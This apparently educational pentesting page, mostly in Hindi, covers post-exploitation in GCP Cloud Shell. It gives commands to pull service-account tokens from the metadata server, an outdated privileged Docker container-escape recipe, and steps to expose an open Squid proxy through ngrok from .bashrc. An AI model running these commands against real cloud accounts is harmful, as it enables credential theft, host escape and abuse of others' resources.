# GCP - Cloud Shell Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Shell

Cloud Shell के बारे में अधिक जानकारी के लिए देखें:

{{#ref}}
../gcp-services/gcp-cloud-shell-enum.md
{{#endref}}

### metadata से users token प्राप्त करना

केवल metadata server तक पहुँचकर आप वर्तमान में logged on user के रूप में access करने के लिए एक token प्राप्त कर सकते हैं:
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
```
### Container Escape / Docker use

> [!WARNING]
> पहले cloud shell एक container में चलता था जिसमें host के docker socket तक पहुंच थी। अब Google ने आर्किटेक्चर बदल दिया है और cloud shell container अब "Docker in a container" सेटअप में चलता है। इसलिए भले ही cloud shell से docker का उपयोग संभव हो, आप docker socket का उपयोग करके host पर escape नहीं कर पाएंगे।
> ध्यान दें कि पहले `docker.sock` फ़ाइल `/google/host/var/run/docker.sock` में स्थित थी लेकिन अब इसे `/run/docker.sock` में स्थानांतरित कर दिया गया है।

<details>

<summary>Docker use / Old container escape commands</summary>
```bash
sudo docker -H unix:///run/docker.sock pull alpine:latest
sudo docker -H unix:///run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///run/docker.sock start escaper
sudo docker -H unix:///run/docker.sock exec -it escaper /bin/sh
```
</details>

इसके अलावा, पहले metadata server में cloud shell VM द्वारा उपयोग किए गए एक service account का token खोजा जा सकता था:

<details>

<summary>Metadata से पुराना service account</summary>
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```
निम्नलिखित scopes के साथ:
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"

https://www.googleapis.com/auth/devstorage.read_only
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```
</details>



### इसे Proxy के रूप में उपयोग करें

यदि आप अपने google cloud shell instance को Proxy के रूप में उपयोग करना चाहते हैं, तो आपको निम्नलिखित कमांड चलानी होंगी (या उन्हें .bashrc file में डालना होगा):

<details>

<summary>Squid proxy इंस्टॉल करें</summary>
```bash
sudo apt install -y squid
```
</details>

जानकारी के लिए, Squid एक http proxy server है। निम्न सेटिंग्स के साथ **squid.conf** फ़ाइल बनाएं:

<details>

<summary>squid.conf फ़ाइल बनाएँ</summary>
```bash
http_port 3128
cache_dir /var/cache/squid 100 16 256
acl all src 0.0.0.0/0
http_access allow all
```
</details>

कॉपी करें **squid.conf** फ़ाइल को **/etc/squid** में

<details>

<summary>कॉन्फ़िग को /etc/squid में कॉपी करें</summary>
```bash
sudo cp squid.conf /etc/squid
```
</details>

अंत में squid सेवा चलाएँ:

<details>

<summary>Squid सेवा शुरू करें</summary>
```bash
sudo service squid start
```
</details>

proxy को बाहर से उपलब्ध कराने के लिए ngrok का उपयोग करें:

<details>

<summary>ngrok के साथ proxy को एक्सपोज़ करें</summary>
```bash
./ngrok tcp 3128
```
</details>

चलाने के बाद tcp:// url कॉपी करें। यदि आप ब्राउज़र से proxy चलाना चाहते हैं तो सुझाव दिया जाता है कि tcp:// हिस्सा और port हटा दें और port को अपने ब्राउज़र की proxy settings के port field में डालें (squid is a http proxy server)।

बेहतर उपयोग के लिए स्टार्टअप पर .bashrc फ़ाइल में निम्नलिखित पंक्तियाँ होनी चाहिए:

<details>

<summary>.bashrc में स्वचालित स्टार्टअप के लिए जोड़ें</summary>
```bash
sudo apt install -y squid
sudo cp squid.conf /etc/squid/
sudo service squid start
cd ngrok;./ngrok tcp 3128
```
</details>

निर्देश इनसे कॉपी किए गए थे: [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key). उस पेज को देखें Cloud Shell में किसी भी प्रकार का सॉफ़्टवेयर चलाने (databases और even windows सहित) के अन्य पागल विचारों के लिए।

{{#include ../../../banners/hacktricks-training.md}}
